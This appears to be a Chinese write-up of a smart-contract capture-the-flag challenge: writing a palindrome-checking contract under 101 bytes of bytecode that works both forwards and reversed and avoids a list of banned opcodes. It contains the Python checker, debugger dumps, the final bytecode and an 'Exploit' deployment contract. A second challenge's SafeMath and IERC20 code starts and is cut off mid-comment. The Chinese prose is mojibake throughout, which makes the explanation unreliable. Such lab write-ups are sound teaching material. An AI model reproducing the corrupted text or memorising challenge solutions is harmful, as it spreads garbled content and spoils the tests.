&#125;\n&#125;\n\nAnalyseåšå‡ºè¿™é“é¢˜éœ€è¦å¯¹æ±‡ç¼–çŸ¥è¯†æœ‰äº›ç†è§£\næˆ‘ä»¬é¦–å…ˆå¯¹é¢˜ç›®åˆçº¦è¿›è¡Œåˆ†æž\n\næ¢³ç†ä¸€ä¸‹æ€è·¯æ¥çœ‹ï¼Œchallengeåˆçº¦ä¸­deployå‡½æ•°åˆ›å»ºdeployeråˆçº¦ï¼ŒèŽ·å¾—åˆçº¦åœ°å€ï¼Œå¹¶ä¸”è°ƒç”¨safeå‡½æ•°å¯¹äºŽåˆ›å»ºæ—¶ä¼ å…¥çš„bytecodeè¿›è¡Œåˆ¤æ–­ï¼Œé™åˆ¶,éƒ¨ç½²çš„åˆçº¦ä¸åº”å«æœ‰ä»¥ä¸‹åŠŸèƒ½\nop == 0x3B // EXTCODECOPY\n|| op == 0x3C // EXTCODESIZE\n|| op == 0x3F // EXTCODEHASH\n|| op == 0x54 // SLOAD\n|| op == 0x55 // SSTORE\n|| op == 0xF0 // CREATE\n|| op == 0xF1 // CALL\n|| op == 0xF2 // CALLCODE\n|| op == 0xF4 // DELEGATECALL\n|| op == 0xF5 // CREATE2\n|| op == 0xFA // STATICCALL\n|| op == 0xFF // SELFDESTRUCT\n\ndeployå‡½æ•°è¢«è°ƒç”¨æ—¶ä¼šéƒ¨ç½²ä¸¤ä¸ªåˆçº¦ï¼Œfwdåœ°å€ä¸ºä»¥codeéƒ¨ç½²çš„åˆçº¦åœ°å€ï¼Œrevæ˜¯ä»¥reversed(list(code))éƒ¨ç½²çš„åˆçº¦åœ°å€ï¼Œå…¶ä¸­flipå‡½æ•°å°±æ˜¯å°†codeè¿›è¡Œå€’åºï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰\næ¯”å¦‚0x1234567890â€”&gt;0x9078563412\nSetupåˆçº¦ä¼šè°ƒç”¨fwdï¼Œrevåˆçº¦ï¼Œcalldataä¸ºmload(0x160,0x160+string.length)ï¼Œä¹‹åŽè¿›è¡Œåˆ¤æ–­returndatasizeæ˜¯å¦éžç©ºï¼Œæ˜¯åˆ™æ‰§è¡Œifï¼Œå¦åˆ™ç›´æŽ¥è¿”å›žfalse\nifä¸­æ‰§è¡Œå†…å®¹ä¸ºå°†æŒ‡é’ˆç§»åŠ¨åˆ°mload(0x40)ï¼Œå¹¶ä¸”å°†returndataæ‹·è´åˆ°pträ¸­ï¼Œè¯»å–mload(ptr)çš„å€¼ä½œä¸ºè¿”å›žå€¼ã€‚å…³äºŽmload(0x40)æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹è¾¹è¿™ä¸€æ®µè§£é‡Š\n\n\n\n\n\n\n\n\n\n As others pointed out, the mload(0x40) returns where the pointer addresses that you can start using it. (free-pointer)\nThe first four 32 bytes (128) are always reserved when your smart contract is deployed. This is the reason your mload(0x40) returns 80. 80 is represented in hex format. It is 128 in decimal, which is where you can start writing in memory! This is how the memory looks like currently.\n\nç›®å‰åˆçº¦éƒ¨åˆ†åˆ†æžå®Œæˆï¼Œå†æ¥çœ‹ä¸€ä¸‹pythonä»£ç éƒ¨åˆ†\nimport eth_sandbox\nfrom weakref import WeakKeyDictionary\nimport web3\nfrom web3 import Web3\nfrom eth_abi import encode_single\nimport random\nimport string\n\ndef random_string(N: int) -> str:\n    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))\n\ndef checker(addr: str, web3: Web3) -> bool:\n    testcases = &#123;\n        \"\": True,\n        \"a\": True,\n        \"ab\": False,\n        \"aba\": True,\n        \"paradigm\": False,\n        \"tattarrattat\": True,\n    &#125;\n\n    for i in range(10):\n        if i % 2 == 0:\n            if random.random() > 0.5:\n                str = random_string(63)\n                testcases[str + random_string(1) + ''.join(reversed(list(str)))] = True\n            else:\n                str = random_string(64)\n                testcases[str + ''.join(reversed(list(str)))] = True\n        else:\n            testcases[random_string(128)] = False\n\n    for k, v in testcases.items():\n        data = web3.sha3(text=\"test(string)\")[:4] + encode_single('uint256', 32) + encode_single('string', k)\n        result = web3.eth.call(\n            &#123;\n                \"to\": addr,\n                \"data\": data,\n            &#125;\n        )\n        if int(result.hex(), 16) != v:\n            return False\n    \n    return True\n\neth_sandbox.run_launcher([\n    eth_sandbox.new_launch_instance_action(deploy_value=Web3.toWei(0, 'ether')),\n    eth_sandbox.new_get_flag_action(checker)\n])\n\nç›¸å½“äºŽè°ƒç”¨testå‡½æ•°ï¼Œå‚æ•°ä¸ºuint256--32ï¼Œå’Œstring--random_string(128)ï¼Œå…¶ä¸­çš„stringæœ‰ä¸¤ç§ç”Ÿæˆæ–¹å¼ï¼Œæœ‰ä¸€åŠä¸ºtrueï¼Œä¸€åŠä¸ºfalseï¼Œå…¶ä¸­trueéƒ¨åˆ†åˆ¤æ–­éšæœºæ•°æ˜¯å¦å¤§äºŽ0.5ï¼Œä¸ºçœŸå°†æ˜¯str=random_string(63)+random_string(1)+reversed(list(str))ï¼Œå¦åˆ™ä¸ºstr=random_string(64)+reversed(list(str)),falseéƒ¨åˆ†ç›´æŽ¥ç”Ÿæˆrandom_string(63)\nè‡ªå·±è¿è¡Œä¸€ä¸‹çœ‹ä¸€çœ‹\n True\na True\nab False\naba True\nparadigm False\ntattarrattat True\nQWTJSI421LTGK7DIPYTWCIOZKB72AUTWKC5VMG6S17TZ13UIAD5CZAIA1FJ0WGWBBWGW0JF1AIAZC5DAIU31ZT71S6GMV5CKWTUA27BKZOICWTYPID7KGTL124ISJTWQ True\nH7Q0SGZPXLBC8Y405032K9YOGC6LOHY2KOSV098P0WDV5OBNABI467OWJSQKXY971M97I3JHFBRR3TYH0BCQIJRB3CGU3XCZ1K43K1X2F5K4FWDBWC023A3YUUGM5K31 False\nSCEKU7670FB1B3TZDXP31MI2AGFZF3T56HATKRU7IEVVGVGZCWRKLCXE3BSJD06660DJSB3EXCLKRWCZGVGVVEI7URKTAH65T3FZFGA2IM13PXDZT3B1BF0767UKECS True\nQTFOQ4MOR53F3ZVAK3I54LR2NW68TNAVJS8S1PVCQS6LWSJDC3PFJU4CIDFV1G2MI4DKDBWYVPCO4X2DJFQLY76GZISGSRENMRG5M1SNW0ZA2INPMXWNE7O0ALD2Z972 False\nI9N053FHRKGJAZ38LHIPICM8TTKY5PAF45ND7OB513VLDIH10MF0UYANUB9V152KK251V9BUNAYU0FM01HIDLV315BO7DN54FAP5YKTT8MCIPIHL83ZAJGKRHF350N9I True\nMPCEVBOGX6KJ3DTA55FF572FTUHWE029DSI3L2546ESZPR1UVSUHM8KPZNPQ0Y6MJTQM6K1A9GS6KIMQ832WF5Z518272ZZ0VLYCL1ACRM0B993YPOZMLC9W9KQI81PK False\nQTUHXHFZKCSSVZ4KNM139MVJBJAL66BODI9I3XVGSMX2EM8JGJYXBFEAB76D6L2M2L6D67BAEFBXYJGJ8ME2XMSGVX3I9IDOB66LAJBJVM931MNK4ZVSSCKZFHXHUTQ True\nA5XJHVVKLGZQC3JIEVD8JFSOT9IPQ9WCEZ46JAIVOFIZDLQD1DRK5FJKBLULLCZAFLEVLP6YCOOXFYVGSAVGIYGJV8JHD3K5IFAGZIYIBVQPRW3ICD01O7OCUS34ZT24 False\nZ8OP27WJOVCNIBYVGKFJ2BCXSZ5HPLMJAZDN9E5JK03BOUBUPG6RK3VUB1JOGBWTWBGOJ1BUV3KR6GPUBUOB30KJ5E9NDZAJMLPH5ZSXCB2JFKGVYBINCVOJW72PO8Z True\n22JCMPM4MMYRH02XQAAXGW0QCRAYP8HLGRZG6A1WL868XBCFFNP585TJHVAGB0CZ53VZ1EB8RCVAP9ARPS1Z7I3O72KZ5OAPDL7DHBAXPA3KP3PPH7TNRLU7MB9NFE8S False\n\næ¯æ¬¡è°ƒç”¨çš„è¿”å›žå€¼ä¸Žboolå€¼ç›¸ç­‰å°±å¯ä»¥å®ŒæˆæŒ‘æˆ˜ï¼Œæ¸…æ¥šäº†æ•´ä½“æµç¨‹ï¼Œæ€è€ƒä¸€ä¸‹æ€Žä¹ˆè¿›è¡Œæ”»å‡»\nåœ¨remixä¸­ä»»æ„å‚æ•°è¿›è¡Œè°ƒç”¨testå‡½æ•°ï¼Œdebugä¸€ä¸‹ï¼Œæ‰§è¡Œåˆ°ç¬¬ä¸€æ¬¡staticcallæ—¶æœ‰ä»¥ä¸‹å†…å­˜å€¼\nstack:\n[\n\t\"0x00000000000000000000000000000000000000000000000000000000002d5cc5\",\n\t\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000004\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000020\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000c4\",\n\t\"0x000000000000000000000000000000000000000000000000000000003ca7255b\",\n\t\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000001c7\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000ae\",\n\t\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"\n]\n\nmemory:\n&#123;\n\t\"0x0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x10\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x20\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x30\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x40\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x50\": \"000000000000000000000000000000c0\\t????????????????\",\n\t\"0x60\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x70\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x80\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x90\": \"00000000000000000000000000000003\\t????????????????\",\n\t\"0xa0\": \"61626100000000000000000000000000\\taba?????????????\",\n\t\"0xb0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0xc0\": \"3ca7255b000000000000000000000000\\t????????????????\",\n\t\"0xd0\": \"00000000000000000000000000000000\\t????????????????\"\n&#125;\n\næ‰€ä»¥ç¬¬ä¸€æ¬¡staticcallçš„å…·ä½“æƒ…å†µæ˜¯stasiccall(gas=0x2d5cc5,to=0x5c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d,in=0xc0,insize=0x04,out=0xc0,outsize=0x20)\ncalldataè‡ªç„¶å°±æ˜¯memory[0xc0:0xc0+4]ä¹Ÿå°±æ˜¯0x3ca7255bï¼Œæ ¹æ®å½“å‰æ‰§è¡Œåˆ¤æ–­ä¸€ä¸‹ï¼Œä¸éš¾å‘çŽ°è¿™ä¸ªdataå°±æ˜¯fwd()çš„function selectorï¼Œè¿™æ ·æˆ‘ä»¬æ¸…æ¥šäº†staticcallçš„ç»“æž„ï¼ŒæŽ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ç¬¬äºŒæ¬¡stsiccallï¼Œå¾—åˆ°æ•°æ®å¦‚ä¸‹\nstack:\n[\n\t\"0x00000000000000000000000000000000000000000000000000000000002d50ef\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000a0\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000003\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000001c7\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n\t\"0x0000000000000000000000000000000000000000000000000000000000000080\",\n\t\"0x00000000000000000000000000000000000000000000000000000000000000ae\",\n\t\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"\n]\n\nmemory:\n&#123;\n\t\"0x0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x10\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x20\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x30\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x40\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x50\": \"000000000000000000000000000000e0\\t????????????????\",\n\t\"0x60\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x70\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x80\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0x90\": \"00000000000000000000000000000003\\t????????????????\",\n\t\"0xa0\": \"61626100000000000000000000000000\\taba?????????????\",\n\t\"0xb0\": \"00000000000000000000000000000000\\t????????????????\",\n\t\"0xc0\": \"0000000000000000000000006f16a4f3\\t????????????o???\",\n\t\"0xd0\": \"43b671b610476c5dcb740e4c5afcbac1\\tC?q??Gl??t?LZ???\"\n&#125;\n\næ‰€ä»¥ç¬¬äºŒæ¬¡staticcallè°ƒç”¨å…·ä½“ä¸ºstasiccall(gas=0x2d50ef,to=0x000000000000000000000000000000000000,in=0xa0,insize=0x03,out=0x00,outsize=0x00)\ncalldataåˆ™ä¸ºmemory[0xa0:0xa0+3]ä¹Ÿå°±æ˜¯0x616261\nå†æ ¹æ®ä¹‹å‰çš„åˆ†æžï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè¿™ä¸ªchallengeçš„æœ¬æ„å°±æ˜¯å¯¹äºŽè¾“å…¥çš„stringæ˜¯å¦æ˜¯å›žæ–‡è¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯åˆ™trueï¼Œå¦åˆ™falseï¼Œæ‰€ä»¥ç”¨100ä½bytecodeå†™ä¸€ä¸ªå›žæ–‡åˆ¤æ–­åˆçº¦å°±å¥½ï¼Œæž„å»ºåˆçº¦å¦‚ä¸‹ï¼š\ncontract atttack&#123;\n    fallback()external&#123;\n        assembly&#123;\n            calldatacopy(0x00, 0x00, calldatasize())\n            let left := 0x00\n            let right := sub(calldatasize(),1)\n            for &#123;&#125; lt(left, right) &#123;&#125; &#123;\n                let left_r := shr(248,mload(left))\n                let right_r := shr(248,mload(right))\n                if iszero(eq(left_r, right_r)) &#123;\n                    mstore(0x00, 0)\n                    return(0x00, 0x20)\n                &#125;\n                left := add(left,0x01)\n                right := sub(right, 0x01)\n            &#125;\n            mstore(0x00, 1)\n            return(0x00, 0x20)\n            &#125;\n        &#125;\n\n&#125;\n\nç›´æŽ¥ç¼–è¯‘ï¼Œopcodeæ€»å…±æœ‰174ï¼Œæ˜¾ç„¶ä¸ç¬¦åˆé¢˜ç›®åˆçº¦code.length &lt; 101çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±ç”¨bytecodeæ¥å®žçŽ°ç›¸åŒåŠŸèƒ½\nç”±äºŽè‡ªå·±å®žåœ¨æ˜¯å¤ªèœï¼Œçœ‹ä¸€ä¸‹æ ‡å‡†ç­”æ¡ˆè¿›è¡Œä¸€ä¸‹å‚è€ƒå§ðŸ˜©\n&#123;           \n    let i := returndatasize()\n    let m := shr(selfbalance(), calldatasize())\n    let e := sub(calldatasize(), selfbalance())\n    for &#123;&#125; and(\n        eq(shr(248, calldataload(i)), shr(248, calldataload(sub(e, i)))),\n        lt(i, m)\n    ) &#123;i := add(i, selfbalance())&#125; &#123;&#125;\n    \n    mstore(callvalue(), eq(i, m))\n    return(callvalue(), 0x20)\n&#125;\n\nç”±äºŽdeployå‡½æ•°é™åˆ¶äº†codeçš„é•¿åº¦ï¼Œæ‰€ä»¥å‚è€ƒç­”æ¡ˆä¸­è¿™ç§å†™æ³•æ˜¯åˆ«æœ‰ç”¨æ„çš„ï¼Œç›´æŽ¥ä½¿ç”¨returndatasizeï¼Œselfbalanceå³å¯é¿å…å¤šä¸€æ¬¡pushæ“ä½œï¼Œå†ç”¨æ•°æ®ä¹Ÿå¯ä»¥ç›´æŽ¥dupï¼Œè€Œä¸æ˜¯é‡æ–°pushï¼ŒèŠ‚çº¦äº†å­—èŠ‚ç (gas)\nè‡ªå·±ç”¨bytecodeå†™åˆçº¦å®žåœ¨æ˜¯å¤ªéš¾äº†ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå·§åŠžæ³•å¾—åˆ°åˆçº¦çš„å­—èŠ‚ç ï¼Œç„¶åŽå†è¿›è¡Œä¸€ä¸‹åˆ†æžç†è§£\nå†™ä¸¤ä¸ªåˆçº¦å¦‚ä¸‹\n//contract 1\ncontract attack&#123;\n    fallback() external&#123;\n        assembly&#123;\n            let i := returndatasize()\n            let m := shr(selfbalance(), calldatasize())\n            let e := sub(calldatasize(), selfbalance())\n            for &#123;&#125; and(\n                eq(shr(248, calldataload(i)), shr(248, calldataload(sub(e, i)))),\n                lt(i, m)\n            ) &#123;i := add(i, selfbalance())&#125; &#123;&#125;\n            \n            mstore(callvalue(), eq(i, m))\n            return(callvalue(), 0x20)\n        &#125;\n    &#125;\n&#125;\n//contract 2\ncontract attack&#123;\n    fallback() external&#123;\n       assembly&#123;\n       \n       &#125;\n    &#125;\n&#125;\n\nåˆ†åˆ«è¿›è¡Œéƒ¨ç½²å¾—åˆ°bytecodeï¼Œå¯¹äºŽå¤§è‡´ä¸€æ ·çš„éƒ¨åˆ†è¿›è¡Œåˆ†å‰²ï¼Œå†åŽ»å¯¹äºŽæ ¸å¿ƒé€»è¾‘è¿›è¡Œåˆ†å‰²ï¼Œreturndatasizeçš„opcodeæ˜¯0x3dreturnçš„opcodeæ˜¯0xf3ï¼ŒèŽ·å¾—åˆ°çš„bytecodeä¸­åªå«æœ‰ä¸€ä¸ª0x3dä»¥åŠä¸¤ä¸ª0xf3æ ¹æ®ä¸¤ä¸ªåˆçº¦å¤§è‡´ä¸€æ ·çš„éƒ¨åˆ†è¿›è¡Œåˆ†å‰²ä¹‹åŽå³å¯å¾—åˆ°codeï¼ˆä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œ0xf3ä¸€å®šä¼šåœ¨0x3dä¹‹åŽï¼‰å¾—åˆ°bytecodeå¦‚ä¸‹\n3d36471c4736035b8183108382033560f81c843560f81c14161560365747830192506018565b8183143452602034f3\n\nå€’ç½®æ‹¼æŽ¥ä¹‹åŽå‘çŽ°å¹¶ä¸æ­£ç¡®ï¼Œæˆ‘ä»¬æ¥ä»”ç»†åˆ†æžä¸€ä¸‹ï¼Œé¦–å…ˆæ¥çœ‹ä¸€ä¸‹deployçš„åˆçº¦çš„codeæ˜¯ä»€ä¹ˆæ ·çš„æž„é€ \nä¸¤æ¬¡deployæˆ‘ä»¬ç”¨0xabcdå’Œ0xåšå‚æ•°ï¼ŒæŸ¥çœ‹çœŸæ­£çš„éƒ¨ç½²çš„codeçš„åŒºåˆ«\n0x:\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000\n0xabcd:\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002abcd000000000000000000000000000000000000000000000000000000000000\n\n\nå‘çŽ°é¦–å…ˆç”¨32å­—èŠ‚è®°å½•äº†lengthï¼Œä¹‹åŽåœ¨å†å­˜å‚¨äº†codeï¼Œæ‰€ä»¥åœ¨opcodeä¹‹å‰æœ‰0x20çš„length\n\nå†ç»§ç»­å‘ä¸‹åˆ†æžï¼Œforå¾ªçŽ¯æ‰§è¡Œæ—¶ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸï¼Œä¸ºå‡åˆ™é€€å‡ºå¾ªçŽ¯ï¼Œè€Œè¿™éƒ¨åˆ†æˆ‘ä»¬æŸ¥çœ‹è‡ªå·±çš„opcodeå‘çŽ°å¹¶æ²¡æœ‰æŒ‡å®šä½ç½®ï¼Œæˆ‘ä»¬åŽ»å¯»æ‰¾é€€å‡ºå¾ªçŽ¯çš„JUMPDESTä¸ºç¬¬38ä½ï¼Œä¹Ÿå°±æ˜¯0x26,è¿™é‡Œçš„0x2aæ˜¯é”™è¯¯çš„ï¼Œè¿›è¡Œä¿®æ”¹\nå†æ¬¡å‘ä¸‹åˆ†æžï¼Œæ‰§è¡Œå®Œforå¾ªçŽ¯ä¸­çš„å†…å®¹ä¹‹åŽï¼Œä¼šæ‰§è¡ŒJUMPæ— æ¡ä»¶è·³è½¬ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåº”è¯¥æ˜¯è·³è½¬åˆ°forå¾ªçŽ¯çš„å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªJUMPDESTï¼Œåœ¨opcodeä¸­æ˜¯ç¬¬ä¸ƒä½ï¼Œè€Œè¿™é‡Œæ‰§è¡Œçš„å´æ˜¯PUSH1 0x18ï¼Œæ˜¾ç„¶æ˜¯ä¸å¯¹çš„ï¼Œå°†è¿™é‡Œçš„pushå€¼æ”¹æˆ0x07\n\n\nï¼ˆpsï¼šJUMP1ä»¥åŠJUMPçš„é‡Šä¹‰å¦‚ä¸Šä¸¤å›¾ï¼‰\næœ€ç»ˆå¾—åˆ°ä¿®æ”¹åŽçš„code\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3\nå€’ç½®æ‹¼æŽ¥ä¹‹åŽå¾—åˆ°ç»“æžœï¼š\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\næˆ–ï¼š\n0x3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\n\nå¾—åˆ°ç»“æžœä¹‹åŽè¿›è¡Œæ”»å‡»åˆçº¦éƒ¨ç½²å³å¯\nAttackcontract Exploit &#123;\n    constructor(Setup setup) payable &#123;\n        // setup.challenge().deploy(hex\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\");\n        setup.challenge().deploy(hex\"3d36471c4736035b8183108382033560f81c843560f81c1416156026575b47830192506007565b8183143452602034f3f334206052341483815b56076050920183475b5726601516141cf86035841cf860350382831083815b0336471c47363d\");\n\n        payable(setup.challenge().fwd()).transfer(1);\n        payable(setup.challenge().rev()).transfer(1);\n    &#125;\n&#125;\n\néƒ¨ç½²åˆçº¦ï¼Œè¿›è¡Œæµ‹è¯•\n\npythonç”Ÿæˆçš„éšæœºæ•°ä¸­ç¬¬ä¸€ç§æƒ…å†µ\n\nç¬¬äºŒç§æƒ…å†µ\n\næµ‹è¯•æ­£ç¡®ï¼Œå®ŒæˆæŒ‘æˆ˜ï¼\n2.upgrade\nClick to see more\npragma solidity ^0.6.0;\n\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is\n     * zero by default.\n     *\n     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.\n     */\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value 